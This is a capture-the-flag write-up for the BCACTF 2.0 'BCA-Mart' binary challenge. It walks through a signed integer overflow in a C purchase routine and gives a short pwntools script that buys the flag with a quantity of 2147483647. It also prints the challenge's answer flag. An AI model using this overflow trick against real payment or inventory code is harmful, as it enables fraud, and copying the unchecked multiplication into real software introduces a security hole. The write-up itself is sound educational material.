# BCACTF 2.0 – BCA-Mart

* **Category:** Binex
* **Points:** 75
* **Author:** [Wesley V](https://github.com/retoxified)

## Challenge

> After the pandemic hit, everybody closed up shop and moved online. Not wanting to be left behind, BCA MART is launching its own digital presence. Shop BCA MART from the comfort of your own home today!

## Solution

The challenge page provides us with a [binary](Backup/bca-mart) and the [C code](Backup/bca-mart.c) it was compiled from.

Running the executable presents us with our current money($15), and a list of items we can purchase.
```C
        puts("1) Hichew™: $2.00");
        puts("2) Lays® Potato Chips: $2.00");
        puts("3) Water in a Bottle: $1.00");
        puts("4) Not Water© in a Bottle: $2.00");
        puts("5) BCA© school merch: $20.00");
        puts("6) Flag: $100.00");
        puts("0) Leave");
```

Number 6 appears to be the option to purchase the flag, but it costs more than we have available, let's have a look at the purchasing code.
```C
int purchase(char *item, int cost) {
    int amount;
    printf("How many %s would you like to buy?\n", item);
    printf("> ");
    scanf("%d", &amount);

    if (amount > 0) {
        cost *= amount;
        printf("That'll cost $%d.\n", cost);
        if (cost <= money) {
            puts("Thanks for your purchse!");
            money -= cost;
        } else {
            puts("Sorry, but you don't have enough money.");
            puts("Sucks to be you I guess.");
            amount = 0;
        }
    } else {
        puts("I'm sorry, but we don't put up with pranksters.");
        puts("Please buy something or leave.");
    }

    return amount;
}
```

The amount of flags we want to buy has to be larger than 0, so we can't buy zero or a negative amount of flags, and the item cost is not under our control. However, the code does the quantity * cost multiplication without any bounds checks, so entering a large enough quantity can cause the cost variable to overflow so it wraps around to being negative, which will pass the checks and this lets us buy the flag.

Entering a quantity between 21474837 and 2147483647 will work, as these will all end up overflowing the cost. I went with the maximum value a signed 32 bit integer can hold because this will cleanly overflow to cost the same as purchasing -1 flag, so $-100.00.

The script I used to solve the challenge is as follows;
```python
from pwn import *

#p = process('bca-mart')
p = remote('bin.bcactf.com', 49153)

p.sendline('6') # 6) Flag: $100.00
p.sendline('2147483647') # Maximum value a signed 32 bit integer can hold, to overflow cost

p.interactive()
```

This will output the following;
```
Welcome to BCA MART!
We have tons of snacks available for purchase.
(Please ignore the fact we charge a markup on everything)

1) Hichew™: $2.00
2) Lays® Potato Chips: $2.00
3) Water in a Bottle: $1.00
4) Not Water© in a Bottle: $2.00
5) BCA© school merch: $20.00
6) Flag: $100.00
0) Leave

You currently have $15.
What would you like to buy?
> How many super-cool ctf flags would you like to buy?
> That'll cost $-100.
Thanks for your purchse!
bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}
...
```

So the flag for this challenge is:

`bcactf{bca_store??_wdym_ive_never_heard_of_that_one_before}`